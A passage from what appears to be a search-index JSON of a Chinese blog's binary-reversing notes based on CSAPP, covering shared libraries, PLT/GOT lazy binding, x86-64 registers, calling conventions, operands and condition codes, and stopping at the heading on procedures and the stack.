<li>\u66f4\u65b0\u7ef4\u62a4\uff1a\u7531\u4e8e\u9759\u6001\u5e93\u5fc5\u7136\u8981\u5b9e\u65f6\u66f4\u65b0\uff0c\u5982\u679c\u7a0b\u5e8f\u5458\u60f3\u8981\u4f7f\u7528\u4e00\u4e2a\u5e93\u7684\u6700\u65b0\u7248\u672c\uff0c\u5fc5\u987b\u83b7\u53d6\u5e93\u7684\u6700\u65b0\u7248\uff0c\u7136\u540e\u663e\u5f0f\u5730\u5c06\u7a0b\u5e8f\u4e0e\u66f4\u65b0\u7684\u5e93\u91cd\u65b0\u94fe\u63a5</li> <li>\u91cd\u590d\u5360\u7528\u5185\u5b58\uff1a\u5185\u5b58\u59cb\u7ec8\u662f\u7a00\u6709\u8d44\u6e90\uff0c\u4f8b\u5982\u51e0\u4e4e\u6bcf\u4e2a\u7a0b\u5e8f\u90fd\u4f1a\u4f7f\u7528\u6807\u51c6 I/O \u51fd\u6570\uff08printf...\uff09\uff0c\u9759\u6001\u94fe\u63a5\u65f6\uff0c\u8fd9\u4e9b\u51fd\u6570\u7684\u4ee3\u7801\u4f1a\u88ab\u590d\u5236\u5230\u6bcf\u4e2a\u8fd0\u884c\u8fdb\u7a0b\u7684\u6587\u672c\u6bb5\u4e2d</li> </ul> <p>\u5171\u4eab\u5e93\uff08shared library\uff09\u662f\u81f4\u529b\u4e8e\u89e3\u51b3\u9759\u6001\u5e93\u7f3a\u9677\u7684\u4e00\u4e2a\u73b0\u4ee3\u521b\u65b0\u4ea7\u7269\u3002\u5171\u4eab\u5e93\u662f\u4e00\u4e2a\u76ee\u6807\u6a21\u5757\uff0c\u5728\u8fd0\u884c\u6216\u52a0\u8f7d\u65f6\uff0c\u53ef\u4ee5\u52a0\u8f7d\u5230\u4efb\u610f\u7684\u5185\u5b58\u5730\u5740\uff0c\u5e76\u548c\u4e00\u4e2a\u5728\u5185\u5b58\u4e2d\u7684\u7a0b\u5e8f\u94fe\u63a5\u8d77\u6765\uff0c\u8be5\u8fc7\u7a0b\u79f0\u4e3a\u52a8\u6001\u94fe\u63a5\uff08dynamic linking\uff09\uff0c\u7531\u52a8\u6001\u94fe\u63a5\u5668\uff08dynamic linker\uff09\u6267\u884c\u3002</p> <p>\u5171\u4eab\u5e93\u4e5f\u88ab\u79f0\u4e3a\u5171\u4eab\u76ee\u6807\uff08share target\uff09\uff0c\u901a\u5e38\u7528 .so \u540e\u7f00\u3002</p> <pre><code>gcc -shared -fpic -o libvector.so addvec.c multvec.c\ngcc -o prog21 main2.c ./libvvector.so\n</code></pre> <ul> <li>-shared \u6307\u793a\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5171\u4eab\u7684\u76ee\u6807\u6587\u4ef6</li> <li>-fpic \u6307\u793a\u7f16\u8bd1\u5668\u751f\u6210\u4e0e\u4f4d\u7f6e\u65e0\u5173\u7684\u4ee3\u7801</li> </ul> <p></p> <p>\u503c\u5f97\u6ce8\u610f\u7684\u4e24\u70b9\uff0c\u9996\u5148\uff0c\u5728\u4efb\u4f55\u7ed9\u5b9a\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5e93\u53ea\u6709\u4e00\u4e2a .so \u6587\u4ef6\uff0c\u6240\u6709\u5f15\u7528\u8be5\u5e93\u7684\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u5171\u4eab\u8be5 .so \u6587\u4ef6\u4e2d\u7684\u4ee3\u7801\u548c\u6570\u636e\uff0c\u800c\u4e0d\u662f\u50cf\u9759\u6001\u5e93\u7684\u5185\u5bb9\u90a3\u6837\u88ab\u590d\u5236\u548c\u5d4c\u5165\u5230\u5f15\u7528\u5b83\u4eec\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002\u5176\u6b21\uff0c\u5728\u5185\u5b58\u4e2d\uff0c\u4e00\u4e2a\u5171\u4eab\u5e93\u7684 .text \u8282\u7684\u4e00\u4e2a\u526f\u672c\u53ef\u4ee5\u88ab\u4e0d\u540c\u7684\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u5171\u4eab\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#pltgot","title":"PLT&amp;GOT","text":"<p>\u7528\u4e8e\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u53c2\u8003\uff1ahttps://www.yuque.com/hxfqg9/bin/ug9gx5</p> <p></p> <p>\u5bf9\u5e94 PLT \u5730\u5740\u6307\u5411\u7684\u662f GOT \u7684\u5730\u5740\uff0cGOT \u8868\u6307\u5411\u7684\u5c31\u662f printf \u51fd\u6570\u5177\u4f53\u4ee3\u7801\u4f4d\u7f6e\u3002</p> <p>\u4ec0\u4e48\u662f\u5ef6\u8fdf\u7ed1\u5b9a\u5462\uff1f\u53ea\u6709\u52a8\u6001\u5e93\u51fd\u6570\u5728\u88ab\u8c03\u7528\u65f6\uff0c\u624d\u4f1a\u5730\u5740\u89e3\u6790\u548c\u91cd\u5b9a\u4f4d\u5de5\u4f5c\u3002</p> <p>\u4e00\u5f00\u59cb\uff0cprintf@got \u662f lookup_printf \u51fd\u6570\u7684\u5730\u5740\uff0c\u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5bfb\u627e printf() \u7684\u5730\u5740\uff0c\u7136\u540e\u5199\u5165 printf@got\uff0clookup_printf \u6267\u884c\u5b8c\u6bd5\u540e\u5c31\u627e\u5230\u4e86\uff0c\u7136\u540e\u8bb0\u5f55\u5230 got \u8868\u4e2d\uff0c\u6b64\u540e\u5c31\u4e0d\u518d\u9700\u8981\u627e\u4e86\uff01</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#x86amd","title":"\u7a0b\u5e8f\u7684\u673a\u5668\u7ea7\u8868\u793a\uff1ax86/amd \u6c47\u7f16","text":"<p>1978 \u5e74\u7684 8086 \u5904\u7406\u5668\u662f 16 \u4f4d\u5904\u7406\u5668\uff0c1985 \u5e74\u56e0\u7279\u5c14\u53d1\u5e03 i386 \u5c06\u4f53\u7cfb\u6269\u5c55\u5230 32 \u4f4d\u3002\u56e0\u7279\u5c14\u5904\u7406\u5668\u7cfb\u5217\u6709\u5f88\u591a\u540d\u5b57\uff0c\u5305\u62ec IA32\uff08Intel Architecture 32-bit\uff09\uff0c\u901a\u5e38\u90fd\u5c06 32 \u4f4d\u7684\u79f0\u4e3a X86 \u3002</p> <p>\u968f\u540e\u5728\u5411 64 \u4f4d\u8fc7\u5ea6\u7684\u65f6\u5019\uff0c\u56e0\u7279\u5c14\u53d1\u5e03 IA64\uff0c\u7531\u4e8e\u4e0e\u539f\u6765\u7684 X86 \u67b6\u6784\u4e0d\u517c\u5bb9\uff0c\u5e02\u573a\u53cd\u5e94\u6781\u5dee\uff0c\u6b64\u65f6 AMD \u7387\u5148\u641e\u51fa\u4e86\u4e0e\u539f X86 \u517c\u5bb9\u7684 64 \u4f4d\u5904\u7406\u5668\uff0c\u79f0\u4e3a x86-64\uff0c\u4e5f\u53eb AMD64\u3002</p> <p>\u7531\u4e8e x86-64 \u4e0e\u539f X86 \u517c\u5bb9\uff0c\u6b64\u5904\u4e3b\u8981\u4ecb\u7ecd x86-64\uff0c\u4e5f\u5c31\u662f AMD64\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c32 \u4f4d\u548c 64 \u4f4d\u7a0b\u5e8f\u6709\u4ee5\u4e0b\u7b80\u5355\u7684\u533a\u522b</p> <ul> <li> <p>x86</p> <ul> <li>\u51fd\u6570\u53c2\u6570 \u4f1a\u88ab\u4f18\u5148\u538b\u5165\u6808\u4e2d\uff0c\u7136\u540e\u624d\u5c06 \u51fd\u6570\u8fd4\u56de\u5730\u5740 \u538b\u5165\u6808</li> </ul> </li> <li> <p>x64</p> <ul> <li> <p>System V AMD64 ABI (Linux\u3001FreeBSD\u3001macOS \u7b49\u91c7\u7528) \u4e2d\u524d\u516d\u4e2a\u6574\u578b\u6216\u6307\u9488\u53c2\u6570\u4f9d\u6b21\u4fdd\u5b58\u5728 RDI, RSI, RDX, RCX, R8 \u548c R9 \u5bc4\u5b58\u5668 \u4e2d\uff0c\u5982\u679c\u8fd8\u6709\u66f4\u591a\u7684\u53c2\u6570\u7684\u8bdd\u624d\u4f1a\u4fdd\u5b58\u5728\u6808\u4e0a\u3002</p> </li> <li> <p>\u5185\u5b58\u5730\u5740\u4e0d\u80fd\u5927\u4e8e 0x00007FFFFFFFFFFF\uff0c6 \u4e2a\u5b57\u8282\u957f\u5ea6\uff0c\u5426\u5219\u4f1a\u629b\u51fa\u5f02\u5e38\u3002</p> </li> </ul> <p>\u53c2\u89c1\uff1aCSAPP P114</p> <p>\u9ad8 16 \u4f4d\u5730\u5740\u5fc5\u987b\u4e3a 0 \uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u76ee\u524d\u7684 64 \u4f4d\u7cfb\u7edf\u662f 48 \u4f4d\u7cfb\u7edf\uff0c\u4f46\u53ef\u4ee5\u968f\u65f6\u6269\u5c55\u5230 64 \u4f4d\uff01</p> </li> </ul> <p>ATT \u98ce\u683c\u6307\u4ee4\u53c2\u8003 CSAPP \u7b2c\u4e09\u7ae0\u3002</p> <p>\u673a\u5668\u7ea7\u4ee3\u7801\u901a\u5e38\u6307\u4e8c\u8fdb\u5236\u4ee3\u7801\u548c\u6c47\u7f16\u4ee3\u7801\uff0c\u540e\u8005\u5341\u5206\u63a5\u8fd1\u4e8c\u8fdb\u5236\u4ee3\u7801\uff0c\u53ef\u8bfb\u6027\u66f4\u9ad8\uff0c\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u673a\u5668\u7ea7\u4ee3\u7801\u53ea\u662f\u7b80\u5355\u7684\u5c06\u5185\u5b58\u770b\u6210\u4e00\u4e2a\u5f88\u5927\u7684\u3001\u6309\u5b57\u8282\u5bfb\u5740\u7684\u6570\u7ec4\u3002x86-64 \u7684\u865a\u62df\u5730\u5740\u662f\u6309 64 \u4f4d\u7684\u5b57\u6765\u6807\u8bc6\u7684\uff0c\u4f46\u5728\u76ee\u524d\u7684\u5b9e\u73b0\u4e2d\uff0c\u9ad8 16 \u4f4d\u5fc5\u987b\u4e3a 0\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b9e\u9645\u5730\u5740\u8303\u56f4\u4e3a \\(2^{48}\\) \uff08256TB\uff09\uff0c\u4f46\u53ef\u968f\u65f6\u6269\u5c55\u3002</p> <p>\u83b7\u53d6\u6c47\u7f16\u4ee3\u7801\u7684\u65b9\u5f0f\u6709\u4e24\u79cd\uff1a</p> <ul> <li>\u6e90\u4ee3\u7801-&gt;\u6c47\u7f16\u4ee3\u7801\uff1a<code>gcc -Og -S hello.c</code></li> <li>\u4e8c\u8fdb\u5236\u4ee3\u7801-&gt;\u6c47\u7f16\u4ee3\u7801\uff1a<code>objdump -d hello</code></li> </ul> <p>\u901a\u8fc7 objdump \u53cd\u6c47\u7f16\u5f97\u5230\u7684\u6c47\u7f16\u6307\u4ee4\u4e0e GCC \u751f\u6210\u7684\u6c47\u7f16\u4ee3\u7801\u53ef\u80fd\u5b58\u5728\u7ec6\u5fae\u5dee\u522b\uff0c\u4f8b\u5982 call \u4e0e callq\uff0c\u4f46\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u53ef\u4ee5\u5ffd\u7565\u3002</p> <p>\u7531\u4e8e\u6700\u65e9\u662f\u4ece 16 \u4f4d\u4f53\u7cfb\u7ed3\u6784\u6269\u5c55\u4e3a 32 \u4f4d\uff0c\u56e0\u6b64 Intel \u7528\u672f\u8bed <code>\u5b57\uff08word\uff09</code> \u8868\u793a 16 \u4f4d\u5b57\u8282\uff0c\u4e8e\u662f\u79f0 32 \u4f4d\u4e3a <code>\u53cc\u5b57\uff08doubles words\uff09</code> \uff0c\u79f0 64 \u4f4d\u4e3a <code>\u56db\u5b57\uff08quad words\uff09</code>\u3002</p> <p>\u901a\u5e38\uff0cb\u3001w\u3001l\u3001q \u540e\u7f00\u5206\u522b\u7528\u4e8e\u8868\u793a\u5b57\u8282\u3001\u5b57\u3001\u53cc\u5b57\u548c\u56db\u5b57\uff0c\u56e0\u6b64\u5728\u5927\u591a\u6570 GCC \u751f\u6210\u7684\u6c47\u7f16\u4ee3\u7801\u6307\u4ee4\u90fd\u6709\u5b57\u7b26\u540e\u7f00\uff0c\u4f8b\u5982\uff1amovb\uff08\u4f20\u8f93\u5b57\u8282\uff09\u3001movq\uff08\u4f20\u8f93\u56db\u5b57\uff09\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_7","title":"\u5bc4\u5b58\u5668","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_8","title":"\u6574\u6570\u5bc4\u5b58\u5668","text":"<p>\u6bcf\u4e2a x86-64 \u7684\u4e2d\u592e\u5904\u7406\u5355\u5143\uff08CPU\uff09\u5305\u542b\u4e00\u7ec4 16 \u4e2a\u5b58\u50a8 64 \u4f4d\u503c\u7684 \u901a\u7528\u76ee\u7684\u5bc4\u5b58\u5668\uff0c\u7528\u4e8e\u5b58\u50a8\u6574\u6570\u6570\u636e\u548c\u6307\u9488\u3002</p> <p>\u56fe\u793a\u663e\u793a\u4e86\u8fd9 16 \u4e2a\u5bc4\u5b58\u5668\uff0c\u540d\u5b57\u90fd\u4ee5 %r \u5f00\u5934\uff0c\u8fd9\u662f\u7531\u4e8e\u6307\u4ee4\u96c6\u5386\u53f2\u6f14\u5316\u9020\u6210\u7684\u3002</p> <ul> <li> <p>\u6700\u521d\u7684 8086 \u4e2d\u6709 8 \u4e2a 16 \u4f4d\u7684\u5bc4\u5b58\u5668\uff0c\u5373\u56fe\u4e2d\u7684 %ax \u5230 %bp\uff0c\u6bcf\u4e2a\u5bc4\u5b58\u5668\u90fd\u6709\u7279\u6b8a\u7684\u7528\u9014\uff0c\u540d\u5b57\u5c31\u53cd\u6620\u4e86\u8fd9\u4e9b\u4e0d\u540c\u7684\u7528\u9014\u3002</p> </li> <li> <p>\u6269\u5c55\u5230 IA32 \u67b6\u6784\u65f6\uff0c\u5bc4\u5b58\u5668\u4e5f\u6269\u5c55\u6210 32 \u4f4d\u5bc4\u5b58\u5668\uff0c\u6807\u53f7\u4ece %eax \u5230 %ebp\u3002</p> </li> <li>\u6269\u5c55\u5230 x86-64 \u540e\uff0c\u539f\u6765\u7684 8 \u4e2a\u5bc4\u5b58\u5668\u6269\u5c55\u6210 64 \u4f4d\uff0c\u6807\u53f7\u4ece %rax \u5230 %rbp\u3002\u6b64\u5916\u8fd8\u65b0\u589e 8 \u4e2a\u65b0\u7684\u5bc4\u5b58\u5668\uff0c\u5176\u6807\u53f7\u662f\u6309\u7167\u65b0\u7684\u547d\u540d\u89c4\u5219\u5236\u5b9a\u7684\uff1a\u4ece   %r8 \u5230 %r15\u3002</li> </ul> <p></p> <p>\u6b63\u5982\u56fe\u4e2d\u5d4c\u5957\u7684\u65b9\u6846\u6807\u660e\u7684\uff0c\u6307\u4ee4\u53ef\u4ee5\u5bf9\u8fd9 16 \u4e2a\u5bc4\u5b58\u5668\u7684\u4f4e\u4f4d\u5b57\u8282\u4e2d\u5b58\u653e\u7684\u4e0d\u540c\u5927\u5c0f\u7684\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u3002\u5b57\u8282\u7ea7\u64cd\u4f5c\u53ef\u4ee5\u8bbf\u95ee\u6700\u4f4e\u7684\u5b57\u8282\uff0c16 \u4f4d\u64cd\u4f5c\u53ef\u4ee5\u8bbf\u95ee\u6700\u4f4e\u7684 2 \u4e2a\u5b57\u8282\uff0c32 \u4f4d\u64cd\u4f5c\u53ef\u4ee5\u8bbf\u95ee\u6700\u4f4e\u7684 4 \u4e2a\u5b57\u8282\uff0c\u800c 64 \u4f4d\u64cd\u4f5c\u53ef\u4ee5\u8bbf\u95ee\u6574\u4e2a\u5bc4\u5b58\u5668\u3002</p> <ul> <li> <p>%rsp\uff1a\u6808\u9876\u6307\u9488\uff0c\u7528\u6765\u6307\u660e\u8fd0\u884c\u65f6\u6808\u7684\u7ed3\u675f\u4f4d\u7f6e</p> </li> <li> <p>%rax\uff1a\u4fdd\u5b58\u51fd\u6570\u7684\u8fd4\u56de\u503c</p> </li> <li> <p>%rdi, %rsi, %rdx, %rcs, %r8, %r9\uff1a\u4f46\u51fd\u6570 P \u8c03\u7528\u51fd\u6570 Q \u65f6\uff0c\u5047\u8bbe Q \u6709 n&gt;6 \u4e2a\u53c2\u6570\uff0c\u524d 6 \u4e2a\u53c2\u6570\u7684\u503c\u4f1a\u6309\u987a\u5e8f\u4f9d\u6b21\u5b58\u50a8\u5230\u4e0a\u8ff0\u5bc4\u5b58\u5668\u4e2d</p> </li> <li> <p>\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u5bc4\u5b58\u5668\uff1a%rbx, %rbp, %r12, %r13, %r14, %r15</p> </li> </ul> <p>%rbp\uff1a\u6808\u5e27\u6307\u9488\uff0c\u7528\u4e8e\u6807\u8bc6\u5f53\u524d\u6808\u5e27\u7684\u8d77\u59cb\u4f4d\u7f6e</p> <p>\u5f53\u51fd\u6570 P \u8c03\u7528\u51fd\u6570 Q\uff0cQ \u4f5c\u4e3a\u88ab\u8c03\u7528\u8005\u5fc5\u987b\u4fdd\u8bc1\u5728 Q \u8fd4\u56de\u5230 P \u65f6\uff0c\u4e0a\u8ff0\u5bc4\u5b58\u5668\u7684\u503c\u4e0d\u53d8\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cQ   \u8981\u4e48\u6839\u672c\u4e0d\u53bb\u66f4\u6539\u5b83\uff0c\u8981\u4e48\u5c31\u662f\u628a\u539f\u59cb\u7684\u503c\u538b\u5165\u6808\u4e2d\uff0c\u6539\u53d8\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u7136\u540e\u5728\u8fd4\u56de\u524d\u4ece\u6808\u4e2d\u5f39\u51fa\u65e7\u503c\u3002</p> <p>\u6b64\u5904\u538b\u5165\u6808\u7684\u503c\u4f1a\u5728\u6808\u5e27\u4e2d\u7a7f\u4ef6\u6807\u53f7\u4e3a\u201c\u88ab\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u201c\u7684\u4e00\u90e8\u5206\u3002</p> <ul> <li>\u6240\u6709\u5176\u4ed6\u7684\u5bc4\u5b58\u5668\uff0c\u9664\u4e86\u6808\u6307\u9488 %rsp\uff0c\u5747\u4e3a \u8c03\u7528\u8005\u4fdd\u5b58\u5bc4\u5b58\u5668\uff0c\u5305\u542b\u672a\u63d0\u53ca\u7684 %r10 \u548c %r11\u3002\u987e\u540d\u601d\u4e49\uff0c\u5f53 P \u8c03\u7528 Q\uff0cQ   \u53ef\u4ee5\u4efb\u610f\u4fee\u6539\uff0c\u56e0\u4e3a\u5728\u8c03\u7528\u4e4b\u524d\u9996\u5148\u4fdd\u5b58\u597d\u8fd9\u4e9b\u5bc4\u5b58\u5668\u7684\u503c\u662f P\uff08\u8c03\u7528\u8005\uff09\u7684\u8d23\u4efb\u3002</li> </ul> <p>\u9664\u4e0a\u8ff0 16 \u4e2a\u6574\u6570\u5bc4\u5b58\u5668\u5916\uff0c\u8fd8\u6709\u5176\u5b83\u7c7b\u578b\u7684\u5bc4\u5b58\u5668\uff0c\u4f8b\u5982\u7a0b\u5e8f\u8ba1\u6570\u5668\u5bc4\u5b58\u5668 %rip \u8bb0\u5f55\u4e86\u4e0b\u4e00\u6761\u5c06\u6267\u884c\u7684\u6307\u4ee4\u7684\u5730\u5740\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_9","title":"\u6761\u4ef6\u7801\u5bc4\u5b58\u5668","text":"<p>\u53c2\u8003\u300a\u6307\u4ee4\u3001\u64cd\u4f5c\u6570\u3001\u63a7\u5236\u300b\u7ae0\u8282\u7684\u63a7\u5236\u7ae0\u8282\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_10","title":"\u6307\u4ee4\u3001\u64cd\u4f5c\u6570\u3001\u63a7\u5236","text":"<p>\u64cd\u4f5c\u6570</p> <p>\u5927\u591a\u6307\u4ee4\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u64cd\u4f5c\u6570\uff0c\u6307\u793a\u51fa\u6267\u884c\u4e00\u4e2a\u64cd\u4f5c\u8981\u4f7f\u7528\u7684\u6e90\u6570\u636e\u503c\uff0c\u4ee5\u53ca\u653e\u7f6e\u7ed3\u679c\u7684\u76ee\u7684\u4f4d\u7f6e\uff0c\u5206\u4e3a\u4e09\u79cd\u7c7b\u578b\uff1a</p> <ul> <li>\u7acb\u5373\u6570\uff1a\u4e66\u5199\u65b9\u5f0f\u662f \\(\\$\\) \u540e\u9762\u8ddf\u4e00\u4e2a\u6574\u6570\uff0c\u4f8b\u5982 \\(\\$0x1F\\)</li> <li>\u5bc4\u5b58\u5668\uff1a\u901a\u8fc7\u7b26\u53f7 \\(r_a\\)\u8868\u793a\u4efb\u610f\u5bc4\u5b58\u5668 \\(a\\)\uff0c\u7528\u5f15\u7528 \\(R[r_a]\\) \u8868\u793a\u5bc4\u5b58\u5668\u7684\u503c\u3002\u6b64\u5904\u6211\u4eec\u5c06\u5bc4\u5b58\u5668\u96c6\u5408\u770b\u6210\u6570\u7ec4 \\(R\\)\uff0c\u7528\u5bc4\u5b58\u5668\u6807\u8bc6\u7b26\u4f5c\u4e3a\u7d22\u5f15\u3002</li> <li>\u5185\u5b58\u5f15\u7528\uff1a\u6839\u636e\u8ba1\u7b97\u51fa\u7684\u5730\u5740\u8bbf\u95ee\u67d0\u4e2a\u5185\u5b58\u4f4d\u7f6e\uff0c\u56e0\u4e3a\u5c06\u5185\u5b58\u770b\u6210\u4e00\u4e2a\u5f88\u5927\u7684\u5b57\u8282\u6570\u7ec4\uff0c\u901a\u8fc7\u7b26\u53f7 \\(M_b[Addr]\\) \u8868\u793a\u5bf9\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u4ece\u5730\u5740   \\(Addr\\) \u5f00\u59cb\u7684 b \u4e2a\u5b57\u8282\u503c\u7684\u5f15\u7528\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u901a\u5e38\u7701\u7565\u4e0b\u6807 \\(b\\)</li> </ul> <p>\u6b64\u5916\uff0c\u7531\u4e8e\u5b58\u5728\u4e0d\u540c\u7684 \u5bfb\u5740\u6a21\u5f0f\uff1a\u7acb\u5373\u6570\u5bfb\u5740\u3001\u5bc4\u5b58\u5668\u5bfb\u5740\u3001\u7edd\u5bf9\u5bfb\u5740\u7b49\uff0c\u56e0\u6b64\u901a\u5e38\u9700\u8981\u7ec4\u5408\u4e0a\u8ff0\u4e09\u79cd\u5bfb\u5740\u65b9\u5f0f\uff0c\u5177\u4f53\u53c2\u89c1 CSAPP P121\u3002</p> <p>\u6307\u4ee4\uff08AT&amp;T \u98ce\u683c\uff09</p> <ul> <li> <p>\u6570\u636e\u4f20\u9001\u6307\u4ee4\uff1aMOV S, D</p> </li> <li> <p>\u538b\u5165\u548c\u5f39\u51fa\u6808\u6570\u636e\uff1apushq S\u3001pop D</p> </li> <li> <p>\u7b97\u672f\u548c\u903b\u8f91\u64cd\u4f5c\uff1a\u52a0\u51cf\u4e58\u9664\u3001\u79fb\u4f4d\u3001\u903b\u8f91\u3001\u52a0\u8f7d\u6709\u6548\u5730\u5740\uff08leaq S, D\uff09</p> </li> </ul> <p>leaq \u6307\u4ee4\u5b9e\u9645\u4e0a\u662f movq \u6307\u4ee4\u7684\u53d8\u5f62\uff0c\u5f62\u5f0f\u4e0a\u770b\u4ece\u5185\u5b58\u8bfb\u6570\u636e\u5230\u5bc4\u5b58\u5668\uff0c\u4f46\u5b9e\u9645\u4e0a\u4e0d\u662f\u5f15\u7528\u5185\u5b58\uff0c\u800c\u662f \u5c06\u6709\u6548\u5730\u5740\u5199\u5165\u5230\u76ee\u7684\u64cd\u4f5c\u6570   \uff0c\u56e0\u6b64 leaq \u6307\u4ee4\u7684\u4f5c\u7528\u662f\u52a0\u8f7d\u6709\u6548\u5730\u5740\u3002</p> <ul> <li>\u63a7\u5236\uff1a\u4e0a\u8ff0\u6307\u4ee4\u5747\u4e3a\u76f4\u7ebf\u4ee3\u7801\uff0c\u5373\u6307\u4ee4\u4e00\u6761\u4e00\u6761\u6309\u5e8f\u6307\u5411\uff0c\u5b9e\u9645\u4e0a C \u4ee3\u7801\u4e2d\u4f1a\u6709\u63a7\u5236\u8bed\u53e5\u800c\u5bfc\u81f4\u8df3\u8f6c\u3002</li> </ul> <p>\u63a7\u5236</p> <p>\u901a\u5e38\u6765\u8bf4\uff0cC \u8bed\u8a00\u4e2d\u7684\u8bed\u53e5\u548c\u673a\u5668\u4ee3\u7801\u4e2d\u7684\u6307\u4ee4\u90fd\u662f\u6309\u7167\u5b83\u4eec\u5728\u7a0b\u5e8f\u4e2d\u51fa\u73b0\u7684\u6b21\u5e8f\uff0c\u987a\u5e8f\u6267\u884c\u3002\u4f46\u67d0\u4e9b\u7ed3\u6784\uff0c\u6bd4\u5982\u6761\u4ef6\u8bed\u53e5\u3001\u5faa\u73af\u8bed\u53e5\u548c\u5206\u652f\u8bed\u53e5\uff0c\u8981\u6c42\u6709\u6761\u4ef6\u7684\u6267\u884c\uff0c\u6839\u636e\u6570\u636e\u6d4b\u8bd5\u7684\u7ed3\u679c\u6765\u51b3\u5b9a\u64cd\u4f5c\u6267\u884c\u7684\u987a\u5e8f\u3002</p> <p>\u4e3a\u4ec0\u4e48\u5b9e\u73b0\u4e0a\u8ff0\u529f\u80fd\uff0cCPU \u7ef4\u62a4\u7740\u4e00\u7ec4\u5355\u4e2a\u4f4d\u7684 \u6761\u4ef6\u7801\uff08condition code\uff09\u5bc4\u5b58\u5668 \uff0c\u5b83\u4eec\u63cf\u8ff0\u4e86\u6700\u8fd1\u7684\u7b97\u672f\u6216\u903b\u8f91\u64cd\u4f5c\u7684\u5c5e\u6027\u3002\u53ef\u4ee5\u68c0\u6d4b\u8fd9\u4e9b\u5bc4\u5b58\u5668\u6765\u6267\u884c\u6761\u4ef6\u5206\u652f\u6307\u4ee4\uff0c\u5e38\u7528\u7684\u6761\u4ef6\u7801\u6709\uff1a</p> <ul> <li>CF\uff1a\u8fdb\u4f4d\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u4f7f\u6700\u9ad8\u4f4d\u4ea7\u751f\u4e86\u8fdb\u4f4d\u3002\u53ef\u7528\u6765\u68c0\u6d4b\u65e0\u7b26\u53f7\u64cd\u4f5c\u7684\u6ea2\u51fa</li> <li>ZF\uff1a\u96f6\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u51fa\u7684\u7ed3\u679c\u4e3a 0</li> <li>SF\uff1a\u7b26\u53f7\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u5230\u7684\u7ed3\u679c\u4e3a\u8d1f\u6570</li> <li>OF\uff1a\u6ea2\u51fa\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5bfc\u81f4\u4e00\u4e2a\u8865\u7801\u6ea2\u51fa\u2014\u2014\u6b63\u6ea2\u51fa/\u8d1f\u6ea2\u51fa</li> </ul> <p>\u90a3\u6211\u4eec\u5982\u4f55\u8bbf\u95ee\u6761\u4ef6\u7801\u5462\uff1f</p> <p>\u5f53\u8c03\u7528\u67d0\u4e9b\u6307\u4ee4\u65f6\uff0c\u6307\u4ee4\u4f1a\u81ea\u52a8\u6839\u636e\u64cd\u4f5c\u7801\u7684\u60c5\u51b5\u505a\u51fa\u76f8\u5e94\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982 SET\u3001JGE \u6307\u4ee4\u7b49\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_11","title":"\u2606 \u8fc7\u7a0b\u4e0e\u8fd0\u884c\u65f6\u6808\uff08\u6808\u5e27\uff09","text":"<p>\u8fc7\u7a0b</p> 